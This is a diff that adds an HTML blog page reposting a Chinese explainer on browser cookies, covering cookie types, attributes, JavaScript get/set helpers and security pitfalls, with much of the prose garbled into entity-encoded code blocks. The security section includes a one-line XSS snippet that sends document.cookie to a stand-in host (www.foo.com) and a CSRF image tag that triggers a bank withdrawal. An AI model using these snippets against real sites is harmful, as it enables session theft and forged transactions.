@@ -1,0 +1,455 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+  
+  
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+
+
+<link href="/fonts/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet"  />
+<link href="/css/main.css" rel="stylesheet"  />
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+
+        <title> Cookie | issUn </title>
+    </head>
+    <body lang='zh-Hans' >
+        <div class='container' >
+            
+            <div class='headband'></div>
+            <main id='main' class='main'>
+                <div class='main-inner'>
+                    <div class='content-wrap content-wrap-post '>
+                        <a id='btnOpenSideBar' class='icon icon-spread' href='#'  ></a>
+                        <div id='content' class='content'>
+                            
+
+    
+    <article class="post" itemscope itemtype="http://schema.org/Article" >
+        <header class="post-header" >
+            
+            <h1 class="post-title"  itemprop="name headline" >
+                <a class="post-title-link" href="/2017/04/29/cookie-的分类/"  itemprop="url" >
+                    Cookie
+                </a>
+            </h1>
+            
+                <div class="post-meta">
+                    <a href = "/" class="post-meta-avatar">
+                        <img src="/favicon.ico" alt="issUn" >
+                        <span>issUn</span>
+                    </a>
+                    <span class="post-meta-time" >2017-04-29</time>
+                </div>
+            
+        </header>
+        <div class="post-body" itemprop="articleBody">
+            
+                <p>本文转载自<a href="https://github.com/wy-ei/notebook/issues/28" target="_blank" rel="external">https://github.com/wy-ei/notebook/issues/28</a></p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>cookie 按照其属性的不同，常见的可以分为以下类别：</p>
+<h4 id="session-cookie"><a href="#session-cookie" class="headerlink" title="session cookie"></a>session cookie</h4><p>session cookie 没有过期时间，当浏览器关闭后就消失了，浏览器将没有设置过期时间的 cookie 作为 session cookie 来处理。</p>
+<h4 id="Persistent-cookie"><a href="#Persistent-cookie" class="headerlink" title="Persistent cookie"></a>Persistent cookie</h4><p>Persistent cookie(意为：持久 cookie),这类 cookie 有一个明确的过期时间，在这段时间里面访问 cookie 归属的网站的时候都会携带 cookie ，通常用 cookie 来存储一些用户的访问信息，比如保存用户的登录状态，用户不必每次访问网站都进行登录。</p>
+<h4 id="Secure-cookie"><a href="#Secure-cookie" class="headerlink" title="Secure cookie"></a>Secure cookie</h4><p>Secure cookie ，这类 cookie 只会在加密传输的情况下携带，比如通过 HTTPs 传输的时候。在通过 HTTP 传输的时候，不会携带设置有 secure 标记的 cookie。</p>
+<h4 id="HttpOnly-cookie"><a href="#HttpOnly-cookie" class="headerlink" title="HttpOnly cookie"></a>HttpOnly cookie</h4><p>当一个 cookie 被设置为 httpOnly 的以后，这个 cookie 不能被 javascript 这样的脚本语言拿到，只能通过 HTTP 和 HTTPs 传输。</p>
+<h4 id="Third-party-cookie"><a href="#Third-party-cookie" class="headerlink" title="Third-party cookie"></a>Third-party cookie</h4><p>cookie 的 domain 属性和浏览器地址栏中 domain 一致的 cookie 叫做 first-party cookie， 第三方 cookie 就是其 domain 属性不同于 浏览器地址栏中的 domain 的，这类 cookie 通常是属于第三方广告商的，他们会记录用户的访问习惯，和浏览历史，以此做到准确投放广告。</p>
+<p>对于其中的原理，可以举个例子说明：</p>
+<p>当你访问 a.example.com 这个网站的时候，这个网站中引用了广告商 ad.com 的广告，当广告内容被下载后，广告提供商的脚本会设置一个属于 ad.com 的 cookie 。下次当你访问 b.example.com 的时候，这个网站的广告也是 ad.com 提供的，此时向 ad.com 请求广告内容的时候就会携带上次访问 a.example.com 的时候设置的 cookie 。</p>
+<p>对于现代浏览器都提供了禁止第三方 cookie 的选项。</p>
+<h3 id="cookie-的组成"><a href="#cookie-的组成" class="headerlink" title="cookie 的组成"></a>cookie 的组成</h3><p>cookie 由一下几个部分组成：</p>
+<ul>
+<li>name</li>
+<li>value</li>
+<li>其他属性<ul>
+<li>max-age</li>
+<li>path</li>
+<li>domain</li>
+<li>secure</li>
+</ul>
+</li>
+</ul>
+<p><strong>下面详细就以上属性进行说明</strong></p>
+<h4 id="name-和-value"><a href="#name-和-value" class="headerlink" title="name 和 value"></a>name 和 value</h4><p>cookie 中 name 和 value 不能有 , ; = 以及空格 ，因为这几个符号是用来分隔 cookie 中的名和值的。如要包含，则要进行字符转译。在 javascript 中可以使用 encodeURIComponent 来完成。</p>
+<p>对于服务器要设置 cookie 只需要在 HTTP 响应头部中使用 Set-Cookie: token=324 这样的方式就可以了。对于浏览器可以使用以下方法：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">```&#10;&#10;#### max-age&#10;&#10;&#20174;&#35774;&#32622; cookie &#36215;&#65292;&#35813; cookie &#23384;&#22312;&#30340;&#31186;&#25968;&#65292;&#22914;&#26524;&#35774;&#32622; max-age=1000 &#37027;&#20040;&#35813; cookie &#20250;&#22312; 1000 &#31186;&#21518;&#34987;&#21024;&#38500;&#12290;&#22312;&#26089;&#26399;&#21487;&#33021;&#23384;&#22312; expires &#36825;&#20010;&#23646;&#24615;&#65292;&#36825;&#20010;&#23646;&#24615;&#26159;&#35774;&#32622;&#19968;&#20010;&#20855;&#20307;&#30340;&#36807;&#26399;&#26102;&#38388;&#65292;&#22312; HTTP 1.1 &#29256;&#26412;&#20013;&#20197;&#21450;&#34987;&#21435;&#25481;&#20102;&#65292;&#20294;&#26159;&#27983;&#35272;&#22120;&#36824;&#26159;&#20250;&#35748;&#35782;&#23427;&#65292;&#21482;&#26159;&#24403; max-age &#21644; expires &#21516;&#26102;&#23384;&#22312;&#30340;&#26102;&#20505;&#65292;&#35748;&#35782; max-age &#30340;&#27983;&#35272;&#22120;&#20250;&#24573;&#30053; expires&#12290;&#20851;&#20110;&#36825;&#19968;&#28857;&#35814;&#32454;&#21487;&#20197;&#30475;&#36825;&#31687;&#21338;&#23458;&#65306;HTTP Cookies: What&#39;s the difference between Max-age and Expires?&#12290;&#10;&#10;#### domain &#21644; path&#10;&#10;&#22495;&#21517;&#21644;&#36335;&#24452;&#23450;&#20041;&#20102;&#19968;&#20010; cookie &#30340;&#21487;&#35265;&#33539;&#22260;&#65292;&#23427;&#21578;&#35785;&#27983;&#35272;&#22120;&#36825;&#20010; cookie &#30340;&#24402;&#23646;&#33539;&#22260;&#12290;&#20986;&#20110;&#23433;&#20840;&#21407;&#22240;&#65292; domain &#21482;&#33021;&#35774;&#32622;&#20026;&#24403;&#21069;&#22495;&#21517;&#30340;&#19978;&#23618;&#22495;&#21517;&#65292;&#27604;&#22914;&#22312; example.com &#19979;&#23601;&#19981;&#33021;&#25226; cookie &#30340; domain &#35774;&#32622;&#20026; a.example.com &#65292;&#32780; a.example.com&#21487;&#20197;&#35774;&#32622; cookie &#30340; domain &#20026; example.com&#10;&#10;&#23545;&#20110; path &#65292;&#22914;&#26524;&#19968;&#20010; cookie &#30340; path &#20026; /doc &#37027;&#20040;&#22312; /doc/ &#19979;&#38754;&#30340;&#25152;&#26377;&#39029;&#38754;&#37117;&#33021;&#35775;&#38382;&#21040;&#36825;&#20010; cookie &#65288;&#21069;&#25552;&#26159; domain &#20063;&#26159;&#28385;&#36275;&#35201;&#27714;&#65289;&#10;&#10;&#21478;&#22806;&#23545;&#20110; cookie &#65292;&#19981;&#21516;&#30340;&#31471;&#21475;&#26159;&#21542;&#20026;&#36328;&#22495;&#65292;&#36825;&#19968;&#28857;&#26631;&#20934;&#20013;&#23578;&#26410;&#35828;&#26126;&#12290;&#32463;&#36807;&#27979;&#35797;&#19981;&#21516;&#31471;&#21475;&#26159;&#21487;&#20197;&#25343;&#21040;&#20114;&#30456;&#25343;&#21040; cookie &#30340;&#12290;&#10;&#10;#### secure&#10;&#10;&#35774;&#32622;&#20102;&#36825;&#20010;&#23646;&#24615;&#21518;&#65292;cookie &#23601;&#25104;&#20026;&#19968;&#20010; Secure cookie &#65292;&#21482;&#20250;&#22312;&#21152;&#23494;&#20256;&#36755;&#30340;&#26102;&#20505;&#25658;&#24102;&#35813; cookie&#12290;&#10;&#10;### cookie &#30340;&#27880;&#24847;&#20107;&#39033;&#10;&#10;#### &#36328;&#31449;&#33050;&#26412; - cookie &#30423;&#31363;&#10;&#10;&#19968;&#20010; web &#39029;&#38754;&#20013;&#21487;&#20197;&#21253;&#21547;&#26469;&#33258;&#20854;&#20182;&#31449;&#28857;&#30340; js &#33050;&#26412;&#65292;&#32780;&#36825;&#20123;&#33050;&#26412;&#26159;&#21487;&#20197;&#35775;&#38382;&#21040;&#35813;&#32593;&#31449;&#19979;&#30340; cookie &#30340;&#65292;&#36825;&#31181;&#24773;&#20917;&#19979;&#36825;&#20123;&#33050;&#26412;&#23601;&#21487;&#33021;&#23558; cookie &#20869;&#23481;&#21457;&#36865;&#20986;&#21435;&#12290;&#27604;&#22914;&#37319;&#29992;&#19979;&#38754;&#26041;&#27861;&#65292;&#23558; cookie &#21457;&#36865;&#32473; www.foo.com&#10;&#10;&#10;```var img = document.createElement(&#39;img&#39;);&#10;img.src = &#39;www.foo.com?&#39;+ &#39;text=&#39; + escape(document.cookie);</span><br></pre></td></tr></table></figure>
+<h4 id="跨站伪造请求"><a href="#跨站伪造请求" class="headerlink" title="跨站伪造请求"></a>跨站伪造请求</h4><p>假如，Mallory 在访问 Bob 的博客的时候在他的博客中留言，其中包含如下内容：</p>
+<figure class="highlight"><figcaption><span>src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"></span></figcaption><table><tr><td class="code"><pre><span class="line">```&#10;&#22914;&#26524; Bob &#35775;&#38382;&#36807;&#38134;&#34892;&#30340;&#32593;&#31449;&#65292;&#19988;&#20854;&#20013;&#30340; cookie &#36824;&#27809;&#26377;&#36807;&#26399;&#65292;&#37027;&#20040;&#24403; Bob &#22312;&#35775;&#38382;&#33258;&#24049;&#30340;&#21338;&#23458;&#30340;&#26102;&#20505;&#65292;&#23601;&#20250;&#21152;&#36733;&#36825;&#24133;&#22270;&#29255;&#65292;&#23601;&#20250;&#24819; bank.example.com &#21457;&#36215;&#35831;&#27714;&#65292;&#36825;&#26679;&#23601;&#24418;&#25104;&#20102;&#19968;&#27425;&#20266;&#36896;&#30340;&#35831;&#27714;&#12290;&#10;&#10;### &#20351;&#29992; javascript &#25805;&#20316; cookie&#10;&#10;#### &#21462;&#24471; cookie&#10;&#10;&#38656;&#35201;&#27880;&#24847;&#30340;&#26159;&#65306;&#22312; &#27983;&#35272;&#22120;&#20013; javascript &#26159;&#25343;&#19981;&#21040; cookie &#30340;&#36807;&#26399;&#26102;&#38388;&#65292;path&#65292;domain &#31561;&#20449;&#24687;&#30340;&#65292;&#22810;&#26465; cookie &#20043;&#38388;&#26159;&#36890;&#36807; ; &#20998;&#21495;&#21644;&#31354;&#26684;&#20998;&#38548;&#24320;&#26469;&#30340;&#65292;&#24418;&#22914;&#65306;&#34;name=xiaoming; age=21&#34; &#25152;&#20197;&#24819;&#35201;&#33719;&#21462; cookie &#39318;&#20808;&#38656;&#35201;&#20351;&#29992; /;\s/ &#36825;&#26679;&#30340;&#27491;&#21017;&#23558;&#20854;&#20998;&#38548;&#24320;&#26469;&#65292;&#28982;&#21518;&#23545;&#27599;&#19968;&#39033;&#65292;&#20877;&#20351;&#29992; = &#20998;&#21106;&#36825;&#26679;&#23601;&#24471;&#21040;&#20102;&#38190;&#20540;&#12290;&#26368;&#21518;&#22312;&#23545;&#32467;&#26524;&#36827;&#34892;&#19968;&#20123;&#36716;&#30721;&#12290;</span><br></pre></td></tr></table></figure>
+<p>util.getCookie = function(name) {<br>    var cookie = document.cookie;<br>    var list = cookie.split(/;\s/);<br>    for (var i = 0; i &lt; list.length; i++) {<br>        var pair = list[i].split(‘=’);<br>        if (pair[0] == name) {<br>            return decodeURIComponent(pair[1]);<br>        }<br>    }<br>    return null;<br>};<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#### &#35774;&#32622; cookie&#10;&#10;&#32780;&#35774;&#32622; cookie &#30340;&#26041;&#27861;&#21017;&#26159;&#30452;&#25509;&#22312; document.cookie &#19978;&#38754;&#36171;&#20540;&#21363;&#21487;&#65292;&#36825;&#19981;&#20250;&#24433;&#21709;&#21040;&#29616;&#26377;&#30340; cookie &#65288;&#24403;&#24180;&#25105;&#35273;&#24471;&#36825;&#26679;&#20250;&#35206;&#30422;&#25481;&#29616;&#26377;&#30340; cookie&#65292;&#20854;&#23454;&#26159;&#24182;&#19981;&#26159;&#36825;&#26679;&#30340;&#65289;&#65292;&#23545;&#20110; domain &#21644; path &#31561;&#20449;&#24687;&#65292;&#21487;&#20197;&#35774;&#32622;&#20294;&#26159;&#19981;&#20250;&#34987;&#35775;&#38382;&#21040;&#12290;</span><br></pre></td></tr></table></figure></p>
+<p>util.setCookie = function(name, value, dayToLive, option) {<br>    var cookie = name + ‘=’ + encodeURIComponent(value);<br>    if (typeof dayToLive === ‘number’) {<br>        cookie += ‘;max-age=’ + (dayToLive <em> 24 </em> 60 * 60);<br>    }<br>    if (option) {<br>        for (var key in option) {<br>            if (key === ‘path’) {<br>                cookie += ‘;path=’ + option[key];<br>            } else if (key === ‘domain’) {<br>                cookie += ‘;domain=’ + option[key];<br>            } else if (key === ‘secure’) {<br>                cookie += ‘;secure’;<br>            }<br>        }<br>    }<br>    document.cookie = cookie;<br>};<br>```</p>
+
+            
+        </div>
+    </article>
+
+
+
+                        </div>
+                        
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/04/29/cookie-的分类/"
+           data-title="Cookie" data-url="http://zhenghe39.com/2017/04/29/cookie-的分类/">
+      </div>
+    
+  </div>
+
+
+
+                    </div>
+                    
+ 
+    <aside class="sidebar">
+        <div class="sidebar-inner">
+                
+                
+                
+                <ul class='sidebar-nav' >
+                    <li class='active' href="#post-toc"  data-toggle="tab" >文章目录</li>
+                    &nbsp&nbsp
+                    <li href="#site-info" data-toggle="tab" >站点概况</li>
+                </ul>
+                
+                <div class='sidebar-nav-content'>
+                    
+                    <div class='nav-panel post-toc active' id='post-toc'>
+                        <div class='highlight-title' style='display:none;' ></div>
+                        <ol class="nav-menu"><li class="nav-menu-item nav-menu-level-3"><a class="nav-menu-link" href="#分类"><span class="nav-menu-text">分类</span></a><ol class="nav-menu-child"><li class="nav-menu-item nav-menu-level-4"><a class="nav-menu-link" href="#session-cookie"><span class="nav-menu-text">session cookie</span></a></li><li class="nav-menu-item nav-menu-level-4"><a class="nav-menu-link" href="#Persistent-cookie"><span class="nav-menu-text">Persistent cookie</span></a></li><li class="nav-menu-item nav-menu-level-4"><a class="nav-menu-link" href="#Secure-cookie"><span class="nav-menu-text">Secure cookie</span></a></li><li class="nav-menu-item nav-menu-level-4"><a class="nav-menu-link" href="#HttpOnly-cookie"><span class="nav-menu-text">HttpOnly cookie</span></a></li><li class="nav-menu-item nav-menu-level-4"><a class="nav-menu-link" href="#Third-party-cookie"><span class="nav-menu-text">Third-party cookie</span></a></li></ol></li><li class="nav-menu-item nav-menu-level-3"><a class="nav-menu-link" href="#cookie-的组成"><span class="nav-menu-text">cookie 的组成</span></a><ol class="nav-menu-child"><li class="nav-menu-item nav-menu-level-4"><a class="nav-menu-link" href="#name-和-value"><span class="nav-menu-text">name 和 value</span></a></li><li class="nav-menu-item nav-menu-level-4"><a class="nav-menu-link" href="#跨站伪造请求"><span class="nav-menu-text">跨站伪造请求</span></a></li></ol></li></ol>
+                    </div>
+                    
+                    <div class='nav-panel  ' id='site-info' >
+                        <div class='author'>
+                            
+                            <div class='author-img'></div>
+                            <div class='author-socialInfo'>
+                            
+                                <a href="https://github.com/samuerio" target="_blank" class="icon icon-github" title="github"></a>
+                            
+                            
+                                <a href="mailto:zhenghe39@gmail.com" target="_blank" class="icon icon-email" title="Email Me"></a>
+                            
+                            </div>
+                        </div>
+                        
+    <div class='categorieslist'>
+        <p class='categorieslist-title'>分类</p>
+        <ul>
+            
+                
+                    <li class="categorieslist-item">
+                        <a  href="/categories/参考资料/" title="参考资料">参考资料</a>
+                    </li>
+                
+            
+                
+                    <li class="categorieslist-item">
+                        <a  href="/categories/精选转载/" title="精选转载">精选转载</a>
+                    </li>
+                
+            
+                
+                    <li class="categorieslist-item">
+                        <a  href="/categories/编程札记/" title="编程札记">编程札记</a>
+                    </li>
+                
+            
+        </ul>
+    </div>
+
+                        
+    <div class="tagslist" >
+        <p class="tagslist-title">标签</p>
+        <ul>
+            
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Javascript/' title=Javascript>Javascript</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Css/' title=Css>Css</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Java/' title=Java>Java</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/React/' title=React>React</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Maven/' title=Maven>Maven</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Jsp/' title=Jsp>Jsp</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Http/' title=Http>Http</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Oracle/' title=Oracle>Oracle</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/mongodb/' title=mongodb>mongodb</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Shell/' title=Shell>Shell</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Web/' title=Web>Web</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/JDK/' title=JDK>JDK</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Redux/' title=Redux>Redux</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/随笔/' title=随笔>随笔</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/编码/' title=编码>编码</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/OOP/' title=OOP>OOP</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/JSON/' title=JSON>JSON</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Cookie/' title=Cookie>Cookie</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Tomcat/' title=Tomcat>Tomcat</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Node/' title=Node>Node</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Myeclipse/' title=Myeclipse>Myeclipse</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/svn/' title=svn>svn</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Html/' title=Html>Html</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Dom/' title=Dom>Dom</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Tool/' title=Tool>Tool</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/SPA/' title=SPA>SPA</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/nginx/' title=nginx>nginx</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/软件设计/' title=软件设计>软件设计</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/zTree/' title=zTree>zTree</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/vi/' title=vi>vi</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/Nginx/' title=Nginx>Nginx</a>
+                    </li>
+                
+            
+                
+                    <li class="tagslist-item">
+                        <a  href='/tags/MvvM/' title=MvvM>MvvM</a>
+                    </li>
+                
+            
+        </ul>
+     </div>
+
+                    </div>
+                </div>
+        </div>
+    </aside>
+
+
+                </div>
+            </main>
+        </div>
+        
+        
+
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"issUn"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+
+
+        <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/jquery-spyNavMenu.js"></script>
+<script>
+      /*
+      $('#btnCloseSideBar').click(function(){
+        $('.sidebar').css('display', 'none');
+        $('#btnOpenSideBar').css('display', 'block');
+        $('.main-inner').addClass('main-inner-center');
+      });
+
+       $('#btnOpenSideBar').click(function(){
+              $('.sidebar').css('display', 'block');
+              $('#btnOpenSideBar').css('display', 'none');
+              $('.main-inner').removeClass('main-inner-center');
+        });
+        */
+
+        var navMenu = $('.nav-menu').length && $('.nav-menu').spyNavMenu({
+            activeClass:'active',
+            fixOffsetClass:'post-toc-fix',
+            distinguishLineScale:0,
+            events:{
+                'scrollNav':function(navItem,$navMenu){
+                    if(!navItem){
+                        return;
+                    }
+
+                    $('.highlight-title').show();
+                    $('.highlight-title').css({
+                        'top':navItem.top,
+                        'height':navItem.height+'px'
+                    });
+                }
+            }
+        });
+        /*
+        navMenu.on('scrollNav',function($curNavItem,$navMenu){
+            $('.highlight-title').hide();
+
+            if(!$curNavItem){
+                return;
+            }
+            $('.highlight-title').show();
+            $('.highlight-title').css({
+                'top':$curNavItem.offset().top-$navMenu.offset().top,
+                'height':$curNavItem.height()+'px'
+            });
+        });
+        */
+</script>
+    </body>
+</html>
